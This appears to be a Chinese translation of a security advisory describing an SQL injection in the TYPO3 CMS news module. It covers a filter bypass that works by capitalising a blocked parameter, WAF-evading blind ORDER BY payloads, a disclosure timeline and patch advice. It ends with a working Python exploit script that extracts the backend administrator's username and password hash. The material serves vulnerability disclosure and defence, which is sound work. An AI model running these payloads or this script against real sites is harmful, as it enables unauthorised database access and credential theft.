
# 【漏洞分析】TYPO3 CMS 新闻管理模块SQL注入漏洞分析（含exp）


                                阅读量   
                                **98110**
                            
                        |
                        
                                                                                                                                    ![](./img/85881/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：ambionics.io
                                <br>原文地址：[https://www.ambionics.io/blog/typo3-news-module-sqli](https://www.ambionics.io/blog/typo3-news-module-sqli)

译文仅供参考，具体内容表达以及含义原文为准

**[![](./img/85881/t011191c6d5b58ddd67.png)](./img/85881/t011191c6d5b58ddd67.png)**

****

翻译：[knight](http://bobao.360.cn/member/contribute?uid=162900179)

预估稿费：150RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

通过POST，来发送orderByAllowed和orderBy，我们将能够控制SQL语句的一部分，并获得注入漏洞。

<br>

**正文**

新闻模块是TYPO3（Typo3内容管理系统）中最常用的模块之一，现在会受到SQL注入漏洞的攻击。虽然作者已经在4个月里内多次联系厂商，但是至今都没有修复。现在我们发布一下关于利用这个漏洞的细节。 另外，需要注意的是，当模块设置overrideDemand参数为1时，该漏洞就只会在默认情况下可以被利用。

<br>

**描述**

该模块是MVC架构中的一个组成部分。 作为用户，您可以列出并阅读新闻。 前者允许定义过滤消息的标准，例如作者，类别，发布日期等。以下是负责这样做的NewsController.php中的简化代码片段。其中的注释是我自己写的：



```
# List of parameters that cannot be set by the user
＃用户无法设置的参数列表
    protected $ignoredSettingsForOverride = ['demandClass', 'orderByAllowed'];
# This is our entry point
＃这是我们的入口点
# The only parameter, $overwriteDemand, is sent via POST
    ＃唯一的参数$ overwriteDemand是通过POST发送的
    public function listAction(array $overwriteDemand = null)
    {
        # Initializes a Demand Object with default settings  ＃使用默认设置初始化需求对象
        $demand = $this-&gt;createDemandObjectFromSettings($this-&gt;settings);
        # Sets up user-given settings from $overwriteDemand    ＃从$ overwriteDemand设置用户给定的设置
        $demand = $this-&gt;overwriteDemandObject($demand, $overwriteDemand);
        # Builds an SQL query from the Demand object, and runs it  ＃从Demand对象构建一个SQL查询，并运行它
        $newsRecords = $this-&gt;newsRepository-&gt;findDemanded($demand);
        # Displays results         ＃显示结果
        $this-&gt;view-&gt;display($newsRecords);
    }
    protected function overwriteDemandObject($demand, $overwriteDemand)
    {
        # Some values cannot be set by the user: they are removed  ＃某些值不能由用户设置：它们被删除
        foreach ($this-&gt;ignoredSettingsForOverride as $property) {
            unset($overwriteDemand[$property]);
        }
        # Assign values that went through the filter by calling set&lt;$name&gt;($value)  ＃通过调用set &lt;$ name&gt;（$ value）来分配通过过滤器的值
        foreach ($overwriteDemand as $propertyName =&gt; $propertyValue) {
            $methodName = 'set' . ucfirst($propertyName);
            if(is_callable($demand, $setterMethodName))
                $demand-&gt;{$setterMethodName}($propertyValue);
        }
        return $demand;
    }
```

创建后，使用Demand对象的参数构建SQL查询：例如，设置一个作者作为查询条件来添加与此类似的条件来进行添加：

```
WHERE author='{$demand-&gt;getAuthor()}'
```



**原理**

任何属性都可能作为潜在的SQL注入向量。 可能的标准列在了下面：



```
&lt;?php
public function setArchiveRestriction($archiveRestriction)
public function setCategories($categories)
public function setCategoryConjunction($categoryConjunction)
public function setIncludeSubCategories($includeSubCategories)
public function setAuthor($author)
public function setTags($tags)
public function setTimeRestriction($timeRestriction)
public function setTimeRestrictionHigh($timeRestrictionHigh)
public function setOrder($order)
public function setOrderByAllowed($orderByAllowed)
public function setTopNewsFirst($topNewsFirst)
public function setSearchFields($searchFields)
public function setTopNewsRestriction($topNewsRestriction)
public function setStoragePage($storagePage)
public function setDay($day)
public function setMonth($month)
public function setYear($year)
public function setLimit($limit)
public function setOffset($offset)
public function setDateField($dateField)
public function setSearch($search = null)
public function setExcludeAlreadyDisplayedNews($excludeAlreadyDisplayedNews)
public function setHideIdList($hideIdList)
public function setAction($action)
public function setClass($class)
public function setActionAndClass($action, $controller)
```

其中有一些很有用，因为它们不包含在SQL查询中的引号中; limit，offset，和order 看起来可以被利用。 但是不幸的是，前两个都被cast进行了过滤。

然而，最后一个order，通过白名单进行了过滤，而该白名单包含在另一个参数中：



```
&lt;?php
if (Validation::isValidOrdering($demand-&gt;getOrder(), $demand-&gt;getOrderByAllowed())) {
    $order_by_field = $demand-&gt;getOrder();} else {
    # Default
    $order_by_field = 'id';}
```

通过POST，来发送orderByAllowed和orderBy，我们将能够控制SQL语句的一部分，并获得注入漏洞。

但是我们又一次被阻止了：orderByAllowed是黑名单参数之一：它不能通过POST来设置。 这里属于属性过滤/重新设置代码：



```
&lt;?php
protected function overwriteDemandObject($demand, $overwriteDemand){
    # Some values cannot be set by the user: they are removed ＃某些值不能由用户设置：它们被删除
    foreach ($this-&gt;ignoredSettingsForOverride as $property) {
        unset($overwriteDemand[$property]);
    }
# Assign values that went through the filter by calling set&lt;$name&gt;($value)
＃通过调用set &lt;$ name&gt;（$ value）来分配通过过滤器的值
    foreach ($overwriteDemand as $propertyName =&gt; $propertyValue) {
        $methodName = 'set' . ucfirst($propertyName);
        if(is_callable($demand, $setterMethodName))
            $subject-&gt;{$setterMethodName}($propertyValue);
    }
    return $demand;}
```

为了调用setter，将该模块给定参数的第一个字母大写。它让我们绕过unset()过滤器：通过发送大写字母O来代替OrderByAllowed，它不再会被删除，并且setOrderByAllowed（）还会被调用。

我们现在可以定义自己的orderbyallowed：我们就可以随意的使用order语法，我们得到了一个SQL注入漏洞。

开发

由于我们正在利用MySQL上的ORDER BY语句，因此我们的有效载荷必须具有以下形式：



```
IF(
    (
        ORD(SUBSTRING(
            (SELECT password FROM be_user WHERE id=1), 4, 1)
        )) = 0x41
    ),
    id,
    title
)
```

根据测试的结果，消息的排序将发生变化，从而允许我们执行基于测试的SQL注入。

但是，对于一些应用程序逻辑和WAF过滤器，我们需要绕过一些限制，以便能够利用这种SQL注入。

BadChars：

任何大写字母

任何空格

逗号

 SQL注释（由于WAF）

此外，表的名称是我们的有效载荷的前缀。 也就是说，SQL查询语句如下所示：

```
SELECT ... FROM ... ORDER BY tx_news_model_domain_news.$order
```

由于SQL不关心这种情况，所以第一个问题可以被丢弃。 第二个，连同注释，可以通过使用括号语法来绕过，例如：

```
..(SELECT(password)FROM(be_users)WHERE(id=1))...
```

逗号有点烦人，但MySQL提供了一些替代语法，例如SUBSTRING（x FROM y FOR z）而不是SUBSTRING（x，y，z）和（CASE条件WHEN 1 THEN x ELSE y END）而不是 IF（条件，x，y）。

Badchars会被过滤，所以我们现在应该专注于前缀问题。 而不是使用两个字段，我们选择一个数字字段，并将其乘以1或-1，这取决于我们的条件，像这样：

```
uid * (CASE condition WHEN 1 THEN 1 ELSE -1 END)
```

如果条件为真，消息将按照uid排序。 否则，它们将被-uid排序，这意味着它们将以相反的顺序显示。

我们的最终有效载荷如下所示：

```
id*(case(ord(substring((select(password)from(be_users)where(uid=1))from(2)for(1))))when(48)then(1)else(-1)end)
```

我们现在就能够进行盲注了。 默认情况下，会话会绑定IP，这意味着我们无法使用它们来劫持帐户。 我们需要下载并强制进行暴力破解。

<br>

**补丁**

补丁的最佳方法是通过将overrideDemand的参数设置为零来阻止用户更改需求参数。 另一种方法是阻止从GET和POST中包含OrderByAllowed的任何案例变体和URL编码的键。

<br>

**时间线**

2017-01-05发送电子邮件到TYPO3的安全团队，报告通过DateField就可以漏洞利用（相同的向量，只不过更容易）

2017-01-20漏洞被发现，TYPO3表示已经修补

2017-01-25报告了通过OrderByAllowed可以进行漏洞利用

2017-04-05多次尝试后仍然没有回答

<br>

**Exploit**



```
#!/usr/bin/python3
# TYPO3 News Module SQL Injection Exploit
# https://www.ambionics.io/blog/typo3-news-module-sqli
# cf
#
# The injection algorithm is not optimized, this is just meant to be a POC.
#
import requests
import string
session = requests.Session()
session.proxies = {'http': 'localhost:8080'}
# Change this :-)
URL = 'http://vmweb/typo3/index.php?id=8&amp;no_cache=1'
PATTERN0 = 'Article #1'
PATTERN1 = 'Article #2'
FULL_CHARSET = string.ascii_letters + string.digits + '$./'
def blind(field, table, condition, charset):
    # We add 9 so that the result has two digits
    # If the length is superior to 100-9 it won't work
    size = blind_size(
        'length(%s)+9' % field, table, condition,
        2, string.digits
    )
    size = int(size) - 9
    data = blind_size(
        field, table, condition,
        size, charset
    )
    return data
def select_position(field, table, condition, position, char):
    payload = 'select(%s)from(%s)where(%s)' % (
        field, table, condition
    )
    payload = 'ord(substring((%s)from(%d)for(1)))' % (payload, position)
    payload = 'uid*(case((%s)=%d)when(1)then(1)else(-1)end)' % (
        payload, ord(char)
    )
    return payload
def blind_size(field, table, condition, size, charset):
    string = ''
    for position in range(size):
        for char in charset:
            payload = select_position(field, table, condition, position+1, char)
            if test(payload):
                string += char
                print(string)
                break
        else:
            raise ValueError('Char was not found')
    return string
def test(payload):
    response = session.post(
        URL,
        data=data(payload)
    )
    response = response.text
    return response.index(PATTERN0) &lt; response.index(PATTERN1)
def data(payload):
    return {
        'tx_news_pi1[overwriteDemand][order]': payload,
        'tx_news_pi1[overwriteDemand][OrderByAllowed]': payload,
        'tx_news_pi1[search][subject]': '',
        'tx_news_pi1[search][minimumDate]': '2016-01-01',
        'tx_news_pi1[search][maximumDate]': '2016-12-31',
    }
# Exploit
print("USERNAME:", blind('username', 'be_users', 'uid=1', string.ascii_letters))
print("PASSWORD:", blind('password', 'be_users', 'uid=1', FULL_CHARSET))
```
